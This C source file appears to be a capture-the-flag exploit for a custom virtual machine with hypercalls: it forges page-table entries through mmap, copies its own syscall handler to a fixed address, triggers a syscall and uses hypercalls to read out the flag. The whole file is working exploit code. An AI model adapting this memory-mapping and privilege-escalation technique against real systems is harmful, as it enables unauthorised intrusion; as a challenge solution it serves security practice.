#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include "utils/hypercall.h"

#define PDE64_PRESENT  1
#define PDE64_RW       (1U << 1)
#define PDE64_USER     (1U << 2)
#define PDE64_PS       (1U << 7)

void syscall_handler(void);

int main(void){
	void *addr;
	uint64_t *pt;

	puts("now exploiting!");

	addr = mmap((void*)0x80000000, 0x3000, PROT_READ|PROT_WRITE, 0, -1, 0);
	munmap(addr, 0x1000);
	mmap((void*)0xc0000000, 0x1000, PROT_READ|PROT_WRITE, 0, -1, 0);

	pt = addr + 0x2000;
	for(int i = 0; i<2; i++)
		pt[i] = PDE64_PRESENT | PDE64_RW | PDE64_USER | (0x1000*i);
	memcpy((void*)0xc0001389, &syscall_handler, 0x800);

	asm("syscall");

	return 0;
}

void syscall_handler(void){
	char *flag;

	flag = hc_load_module(2, 0, 0, 0x1000);
	hc_write(flag + 0x8040000000, 0x20, 0);

	asm("hlt");
}
